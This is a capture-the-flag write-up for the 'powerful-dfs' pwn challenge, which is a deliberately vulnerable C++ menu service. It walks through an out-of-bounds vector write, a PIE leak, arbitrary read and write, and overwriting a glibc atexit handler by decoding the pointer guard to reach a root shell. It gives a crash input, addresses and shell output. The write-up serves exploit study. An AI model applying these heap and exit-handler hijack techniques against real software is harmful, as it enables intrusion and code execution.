# powerful-dfs CTF pwn writeup

## Status and scope

This writeup analyzes the provided `pwn_powerful-dfs.zip` challenge archive.  The exploit path is through the menu service exposed by `socat`; it does not use `docker exec`, does not patch the binary, and does not pre-stage helper files inside the container.

The analysis sandbox used here did not provide Docker, so the Ubuntu 24.04 container could not be built or run in this environment.  The original binary was executed locally and through a local `socat` TCP listener, and the exploit reached `/bin/sh` through the bug.  The final `solve.py` targets `127.0.0.1:5000` by default and sends `cat /flag` through the exploited shell.  In the supplied Dockerfile, `/flag` is initialized by `entrypoint.sh` as `BKISC{testing}`.

## Reproduction commands

```bash
unzip pwn_powerful-dfs.zip -d powerful-dfs
cd powerful-dfs

docker build -t powerful-dfs .
docker run --rm -it \
  --name powerful-dfs \
  -p 127.0.0.1:5000:4058 \
  powerful-dfs
```

In another terminal:

```bash
nc 127.0.0.1 5000
python3 solve.py --host 127.0.0.1 --port 5000
```

Clean retest:

```bash
docker rm -f powerful-dfs 2>/dev/null || true
docker build -t powerful-dfs .
docker run --rm -it --name powerful-dfs -p 127.0.0.1:5000:4058 powerful-dfs
```

Then:

```bash
python3 solve.py --host 127.0.0.1 --port 5000
```

## Docker files

`Dockerfile`:

```dockerfile
FROM ubuntu:24.04
RUN apt-get update && apt-get install -y --no-install-recommends build-essential socat && rm -rf /var/lib/apt/lists/*
COPY src/ /opt/chal/
WORKDIR /opt/chal
RUN chmod +x powerful-dfs entrypoint.sh
EXPOSE 4058
CMD ["/opt/chal/entrypoint.sh"]
```

`src/entrypoint.sh`:

```bash
echo "BKISC{testing}" > "/flag"
exec socat TCP-LISTEN:4058,reuseaddr,fork EXEC:"/opt/chal/powerful-dfs",stderr
```

## Binary reconnaissance

`file src/powerful-dfs`:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=0a0bb9b171f2c056a14671ffeeb930f7728231a5,
for GNU/Linux 3.2.0, with debug_info, not stripped
```

Protections:

| Protection | Result | Evidence |
| --- | --- | --- |
| PIE | Enabled | ELF type `DYN`; `FLAGS_1: NOW PIE` |
| NX | Enabled | `GNU_STACK` is `RW`, not executable |
| RELRO | Full | `GNU_RELRO` and `BIND_NOW` |
| Stack canary | Enabled | imports `__stack_chk_fail` |
| Debug symbols | Present | `file` reports `with debug_info, not stripped` |
| CET/IBT/SHSTK | Advertised | GNU property: `x86 feature: IBT, SHSTK` |

Important symbols and PIE-relative offsets:

| Symbol | Offset |
| --- | ---: |
| `dfs_runner(Job*)` | `0x1409` |
| `create_problem()` | `0x1459` |
| `start_job()` | `0x1645` |
| `view_jobs()` | `0x185c` |
| `delete_job()` | `0x1a31` |
| `menu()` | `0x1bb7` |
| `win()` | `0x1c30` |
| `main` | `0x1c51` |
| `dfs_instance::dfs_instance(int)` | `0x20ca` |
| `dfs_instance::addEdge(int,int)` | `0x21aa` |
| `dfs_instance::dfs(...)` | `0x220e` |
| `Job::Job(int, dfs_instance*, unsigned long long)` | `0x2568` |
| `Job::~Job()` | `0x2746` |
| `dfsProblemNum` | `0x10030` |
| `jobNum` | `0x10034` |
| `problems` global vector | `0x10040` |
| `jobs` global vector | `0x10060` |

`win()` is directly useful: it calls `system("/bin/sh")` and then `exit(0)`.

## Reverse engineering summary

The menu loop in `main()` prints five options and dispatches:

1. create a DFS problem,
2. start a DFS job in a detached background thread,
3. print the jobs board,
4. delete a completed job,
5. exit.

The program keeps two global C++ vectors:

```cpp
std::vector<dfs_instance*> problems;  // PIE+0x10040
std::vector<Job*> jobs;               // PIE+0x10060
```

Recovered structure layouts:

```cpp
struct dfs_instance {
    int num;                         // +0x00
    std::vector<std::vector<int>> adj; // +0x08, size 0x18
}; // size 0x20

struct Job {
    int id;                          // +0x00
    dfs_instance *instance;          // +0x08
    uint64_t source;                 // +0x10
    std::atomic<bool> done;          // +0x18
    std::vector<long long> visited;  // +0x20
    std::vector<int> visit_order;    // +0x38
}; // size 0x50
```

`create_problem()` reads `n`, rejects only `n > 0x1000`, allocates a `dfs_instance`, then reads each edge `(u, v)` and calls `dfs_instance::addEdge(u, v)`.

`start_job()` validates the problem index, reads a source node, creates a `Job`, pushes it into `jobs`, then launches a detached `std::thread` running `dfs_runner(job)`.

`view_jobs()` iterates `jobs` and prints fields from each `Job*`.  When `done` is true, it prints all ints in `visit_order`.  This printing behavior is turned into an arbitrary read once a forged `Job` pointer can be installed in the `jobs` vector.

## Root cause vulnerability

`dfs_instance::addEdge(int a, int b)` performs unchecked vector indexing:

```asm
21c0: mov    rax,QWORD PTR [rbp-0x8]
21c4: lea    rdx,[rax+0x8]        ; &this->adj
21c8: mov    eax,DWORD PTR [rbp-0xc] ; attacker-controlled a
21cb: cdqe
21d0: mov    rdi,rdx
21d3: call   std::vector<std::vector<int>>::operator[](unsigned long)
21db: lea    rax,[rbp-0x10]
21e5: call   std::vector<int>::push_back(int const&)
```

There is no validation that `0 <= a <= num`.  `std::vector::operator[]` does no bounds checking, so a negative or very large edge source treats attacker-chosen memory relative to `adj.data()` as a fake `std::vector<int>` object.  If the fake vector fields are shaped as:

```text
+0x00 start
+0x08 finish = target
+0x10 end_of_storage = target + 4*N
```

then each OOB `push_back(value)` writes one attacker-controlled 32-bit value to `target`, and advances `finish` by 4.  This is a 32-bit write-what-where primitive.

A minimal crash trigger is:

```text
1
2
1
-1000000 1
```

Local execution result:

```text
Segmentation fault, status 139
```

The crash occurs while `addEdge()` resolves `adj[-1000000]` and then calls `std::vector<int>::push_back()` on invalid memory.

## Exploit primitive

The exploit uses deterministic heap shaping from the global vectors and C++ allocations.

### 1. PIE leak

Create two problems and three jobs:

```text
p0: n=1, no edges
p1: n=-1, no edges
J0: p0 source 0
J1: p0 source 0
J2: p1 source 0
```

Then create `p2` with `n=2` and eight edges whose source is `-4`.  For this allocation layout, `p2->adj[-4]` aliases the backing array of the global `jobs` vector.  Eight `push_back()` calls advance `jobs[1]` from the real `J1` pointer to `J1+0x20`.

`view_jobs()` now treats `J1+0x20` as a fake `Job`; the printed `Source=` field is a heap pointer.  In local tests this pointer is consistently `PIE + 0x24430`, so:

```python
pie = leaked_source - 0x24430
```

### 2. Arbitrary read

Create `p3` with `n=10`; fill vertex `1`'s `vector<int>` buffer with a forged `Job` object at `PIE+0x24900`.  Its `visit_order` vector points at any target address.

Create `p4` with `n=10`; build a fake writer vector in its vertex-1 buffer and use OOB source `12` to overwrite `jobs[1]` with the forged job pointer.

Now each `view_jobs()` prints bytes from an arbitrary target address as signed 32-bit integers in `Visit Order:`.

### 3. Arbitrary write

For later writer problems, build a fake `std::vector<int>` object inside vertex `1` and use OOB source `14` to point `finish` at the write target.  Each additional OOB edge writes one 32-bit chunk.

This was verified by writing `jobNum` at `PIE+0x10034`; the next started job printed the attacker-chosen job ID.

## Control-flow redirection

A direct saved-return-pointer ret2win is not the preferred final route because the binary advertises SHSTK in its GNU properties.  In local testing, overwriting a saved return address with `win()` caused a crash instead of a clean shell.

The working strategy is to overwrite a glibc `__cxa_atexit` exit-handler function pointer.  The binary registers destructors for the global vectors:

```text
std::vector<dfs_instance*>::~vector()  at PIE+0x9760, arg=&problems=PIE+0x10040
std::vector<Job*>::~vector()           at PIE+0x97ba, arg=&jobs=PIE+0x10060
__dso_handle                           at PIE+0x10008
```

glibc stores C++ atexit entries as:

```text
flavor = 4
encoded function pointer
arg
dso_handle
```

The function pointer is pointer-mangled on x86_64:

```python
encoded = rol64(function ^ pointer_guard, 17)
pointer_guard = ror64(encoded, 17) ^ known_actual_destructor
```

The exploit scans libc writable data for entries where `arg` is `&problems` or `&jobs` and `dso_handle` is `PIE+0x10008`.  It decodes the pointer guard from the original destructor pointer, encodes `win = PIE+0x1c30`, overwrites the encoded handler pointer, and selects menu option 5.  On normal program exit, glibc calls the overwritten handler, which jumps to `win()`.  `win()` begins with `endbr64`, so it is a valid IBT target, and the path is an indirect call rather than a shadow-stack-protected return.

## Local TCP proof

A local `socat` listener was used to verify the same external TCP exploitation path:

```bash
socat TCP-LISTEN:5057,reuseaddr,fork EXEC:"/mnt/data/powerful-dfs/src/powerful-dfs",stderr
python3 solve.py --host 127.0.0.1 --port 5057 --profile local
```

Observed output:

```text
[*] trying profile=local system_off=0x53110 scan_off=0x1e7000
[+] PIE base = 0x5640ded0a000
[+] local: system@libc = 0x7eb51f05f110, libc base guess = 0x7eb51f00c000
[+] exit handler arg=0x5640ded1a060 encoded-fn@0x7eb51f1f31b8
[+] pointer_guard=0x640bdd65f6928186; win=0x5640ded0bc30; encoded win=0x164a50847b6cc817
SHELL_OK
uid=0(root) gid=0(root) groups=0(root)
```

For the Docker target, the same script sends:

```sh
echo SHELL_OK; cat /flag 2>/dev/null || true; id; exit
```

through the exploited shell.  With the provided `entrypoint.sh`, the expected flag line is:

```text
BKISC{testing}
```

## Reliability and assumptions

- The heap layout is deterministic for the shipped binary and the menu sequence used by `solve.py`.
- The script defaults to an Ubuntu 24.04/Noble glibc profile, then falls back to the local analysis-host profile.  If the Docker base image receives a materially different glibc, use `--system-off` and `--scan-off` to supply the libc-specific values.
- The exploit uses only the exposed TCP service when run with `--host 127.0.0.1 --port 5000`.
- Docker was unavailable in this sandbox, so the container rebuild/retest step could not be executed here.  The service path and code execution were verified against the original binary via a local `socat` TCP listener.